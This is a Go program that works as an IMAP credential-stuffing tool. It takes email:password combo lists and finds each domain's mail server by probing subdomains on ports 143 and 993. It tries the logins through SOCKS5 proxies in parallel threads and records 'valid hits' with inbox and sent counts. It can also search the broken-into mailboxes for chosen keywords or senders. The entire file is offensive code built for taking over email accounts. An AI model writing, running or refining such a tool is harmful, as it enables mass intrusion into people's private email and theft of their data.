package main

import (
	"bufio"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"net"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/emersion/go-imap"
	"github.com/emersion/go-imap/client"
	"golang.org/x/net/proxy"
)

const (
	subdomainsFile     = "./src/imap.subdomains.ini"
	configFile         = "./src/imap.config.json"
	validHitsFile      = "imap.valid.hits.txt"
	validHitsCapture   = "imap.valid.hits.capture.txt"
	failedAttemptsFile = "./src/imap.failed.json"
	wordlistDir        = "./wordlist/"
	defaultProxyFile   = "./src/proxies.txt"
	defaultTimeoutMs   = 10000
	defaultThreads     = 10
)

// Global cache for IMAP servers
var imapCache = make(map[string]string)
var cacheLock sync.RWMutex
var verbose bool

// Load IMAP subdomains from file
func loadSubdomains() ([]string, error) {
	file, err := os.Open(subdomainsFile)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var subdomains []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		sub := strings.TrimSpace(scanner.Text())
		if sub != "" {
			subdomains = append(subdomains, sub)
		}
	}

	return subdomains, scanner.Err()
}

// Load IMAP config cache
func loadIMAPConfig() {
	cacheLock.Lock()
	defer cacheLock.Unlock()

	file, err := ioutil.ReadFile(configFile)
	if err == nil {
		json.Unmarshal(file, &imapCache)
	}
}

// Save IMAP server details to config
func saveIMAPConfig() {
	cacheLock.Lock()
	defer cacheLock.Unlock()

	data, _ := json.MarshalIndent(imapCache, "", "  ")
	ioutil.WriteFile(configFile, data, 0644)
}

// Get or discover IMAP server for a domain
func getIMAPServer(domain string, subdomains []string, timeout time.Duration) (string, error) {
	cacheLock.RLock()
	if server, exists := imapCache[domain]; exists {
		cacheLock.RUnlock()
		if verbose {
			fmt.Printf("[VERBOSE] Using cached IMAP server: %s -> %s\n", domain, server)
		}
		return server, nil
	}
	cacheLock.RUnlock()

	if verbose {
		fmt.Printf("[VERBOSE] Discovering IMAP server for domain: %s\n", domain)
	}

	// Try each subdomain and both ports (143 and 993)
	for _, sub := range subdomains {
		for _, port := range []string{"143", "993"} { // Check both ports 143 and 993
			server := fmt.Sprintf("%s.%s:%s", sub, domain, port) // Try each subdomain with both ports
			if verbose {
				fmt.Printf("[VERBOSE] Trying IMAP server: %s\n", server)
			}

			conn, err := net.DialTimeout("tcp", server, timeout)
			if err == nil {
				conn.Close()
				cacheLock.Lock()
				imapCache[domain] = server // Save found server
				cacheLock.Unlock()
				saveIMAPConfig()

				if verbose {
					fmt.Printf("[VERBOSE] Found working IMAP server: %s\n", server)
				}
				return server, nil
			}
		}
	}

	if verbose {
		fmt.Printf("[VERBOSE] No working IMAP server found for %s\n", domain)
	}
	return "", fmt.Errorf("no IMAP server found for %s", domain)
}

// Authenticate and check IMAP using correct response validation
func checkIMAP(email, password, server string, proxyDialer proxy.Dialer, timeout time.Duration, keyword, sender string) (bool, int, int, int) {
	dialer := net.Dial
	if proxyDialer != nil {
		dialer = proxyDialer.Dial
	}

	if verbose {
		fmt.Printf("[VERBOSE] Connecting to IMAP server: %s\n", server)
	}

	// Try connecting to the IMAP server
	conn, err := dialer("tcp", server)
	if err != nil {
		if verbose {
			fmt.Printf("[VERBOSE] Connection failed: %s\n", err)
		}
		return false, 0, 0, 0
	}
	defer conn.Close()

	// Create the IMAP client
	imapClient, err := client.New(conn)
	if err != nil {
		if verbose {
			fmt.Printf("[VERBOSE] IMAP client creation failed: %s\n", err)
		}
		return false, 0, 0, 0
	}
	defer imapClient.Logout()

	// Attempt login
	if verbose {
		fmt.Printf("[VERBOSE] Logging in with: %s\n", email)
	}

	err = imapClient.Login(email, password)
	response := ""
	if err != nil {
		response = err.Error()
	}

	if verbose {
		fmt.Printf("[VERBOSE] Server Response: \"%s\"\n", response)
	}

	// If response contains "LOGIN" or "failed", or is not blank, it's invalid
	if response != "" && (strings.Contains(response, "LOGIN") || response == "failed") {
		if verbose {
			fmt.Printf("[VERBOSE] Login failed due to response: \"%s\"\n", response)
		}
		return false, 0, 0, 0
	}

	if verbose {
		fmt.Printf("[VERBOSE] Login successful. Checking INBOX...\n")
	}

	// Check inbox message count
	mbox, err := imapClient.Select("INBOX", true)
	if err != nil {
		if verbose {
			fmt.Printf("[VERBOSE] Failed to open INBOX: %s\n", err)
		}
		return false, 0, 0, 0
	}
	inboxCount := int(mbox.Messages)

	if verbose {
		fmt.Printf("[VERBOSE] INBOX contains %d messages.\n", inboxCount)
	}

	// If inbox contains 1 or fewer messages, it's invalid
	if inboxCount <= 1 {
		if verbose {
			fmt.Printf("[VERBOSE] Inbox does not have enough messages (only %d). Marking as invalid.\n", inboxCount)
		}
		return false, inboxCount, 0, 0
	}

	// Check the sent count
	mbox, err = imapClient.Select("Sent", true)
	if err != nil {
		if verbose {
			fmt.Printf("[VERBOSE] Failed to open Sent box: %s\n", err)
		}
		return true, inboxCount, 0, 0 // Sent box failure does not make login invalid
	}
	sentCount := int(mbox.Messages)

	if verbose {
		fmt.Printf("[VERBOSE] Sent box contains %d messages.\n", sentCount)
	}

	// Check for keyword and sender matches if provided
	matchingMessages := 0
	if keyword != "" || sender != "" {
		criteria := imap.NewSearchCriteria()
		if keyword != "" {
			criteria.Body = []string{keyword}
		}
		if sender != "" {
			criteria.Header = map[string][]string{"From": {sender}}
		}
		results, _ := imapClient.Search(criteria)
		matchingMessages = len(results)

		if verbose {
			fmt.Printf("[VERBOSE] Found %d matching messages for keyword/sender search.\n", matchingMessages)
		}
	}

	// If all conditions are met, it's valid
	return true, inboxCount, sentCount, matchingMessages
}

// Save result to file
func appendToFile(filename, content string) {
	file, _ := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	defer file.Close()
	file.WriteString(content + "\n")
}

// Print progress and result in green (valid) or red (failed)
func printProgress(index, total int, result string, isValid bool) {
	// Print progress in bright green or red based on validity
	color := "\033[1;32m" // Default to green for valid results
	if !isValid {
		color = "\033[1;31m" // Red for failed results
	}
	fmt.Printf("%s[%d/%d] %s\033[0m\n", color, index, total, result)
}

func main() {
	// Parse arguments
	comboPath := flag.String("c", "", "Combo list file")
	proxyPath := flag.String("p", "", "SOCKS5 proxy list (default: ./src/proxies.txt if -p is used without a path)")
	timeoutMs := flag.Int("d", defaultTimeoutMs, "Timeout in ms")
	threads := flag.Int("t", defaultThreads, "Number of threads")
	keyword := flag.String("k", "", "Keyword to search in inbox")
	sender := flag.String("s", "", "Sender email to search in inbox")
	verboseFlag := flag.Bool("v", false, "Verbose mode for detailed output")
	flag.Parse()

	// Set verbose mode
	verbose = *verboseFlag

	// Handle proxy path defaulting to ./src/proxies.txt if -p is used without a specified path
	useProxy := false
	if *proxyPath == "" && flag.Lookup("p").Value.String() != "" {
		*proxyPath = defaultProxyFile
		useProxy = true
	} else if *proxyPath != "" {
		useProxy = true
	}

	// Load subdomains and config
	subdomains, err := loadSubdomains()
	if err != nil {
		fmt.Println("Error loading subdomains:", err)
		return
	}
	loadIMAPConfig()

	// Load combo file
	file, err := os.Open(*comboPath)
	if err != nil {
		fmt.Println("Error opening combo file:", err)
		return
	}
	defer file.Close()

	// Load proxies (if any)
	var proxyDialer proxy.Dialer
	if useProxy {
		proxyDialer, _ = proxy.SOCKS5("tcp", *proxyPath, nil, proxy.Direct)
	}

	// Process combos
	scanner := bufio.NewScanner(file)
	var wg sync.WaitGroup
	sem := make(chan struct{}, *threads)

	var total int
	for scanner.Scan() {
		total++
	}

	// Reset the scanner for the second pass
	file.Seek(0, 0)
	scanner = bufio.NewScanner(file)

	index := 0
	for scanner.Scan() {
		sem <- struct{}{}
		wg.Add(1)

		go func(combo string) {
			defer wg.Done()
			defer func() { <-sem }()

			index++
			parts := strings.Split(combo, ":")
			if len(parts) != 2 {
				return
			}
			email, password := parts[0], parts[1]
			domain := strings.Split(email, "@")[1]

			if verbose {
				fmt.Printf("Processing %s\n", combo)
			}

			server, err := getIMAPServer(domain, subdomains, time.Duration(*timeoutMs)*time.Millisecond)
			if err != nil {
				appendToFile(failedAttemptsFile, combo)
				printProgress(index, total, fmt.Sprintf("[FAILED] %s", combo), false)
				return
			}

			valid, inbox, sent, matches := checkIMAP(email, password, server, proxyDialer, time.Duration(*timeoutMs)*time.Millisecond, *keyword, *sender)

			// If empty response (-1 inbox count), retry with the next proxy
			if inbox == -1 {
				if verbose {
					fmt.Printf("[VERBOSE] Empty response received. Retrying %s with the next proxy...\n", email)
				}
				return
			}

			if valid {
				appendToFile(validHitsFile, combo)
				capture := fmt.Sprintf("%s %d %d", combo, inbox, sent)
				if *keyword != "" || *sender != "" {
					capture += fmt.Sprintf(" %d %d", matches, matches)
				}
				appendToFile(validHitsCapture, capture)
				printProgress(index, total, fmt.Sprintf("[VALID] %s", capture), true)

				if verbose {
					fmt.Printf("[VERBOSE] Saved valid hit: %s\n", capture)
				}
			} else {
				appendToFile(failedAttemptsFile, combo)
				printProgress(index, total, fmt.Sprintf("[FAILED] %s", combo), false)

				if verbose {
					fmt.Printf("[VERBOSE] Saved failed attempt: %s\n", combo)
				}
			}

		}(scanner.Text())
	}

	wg.Wait()
}
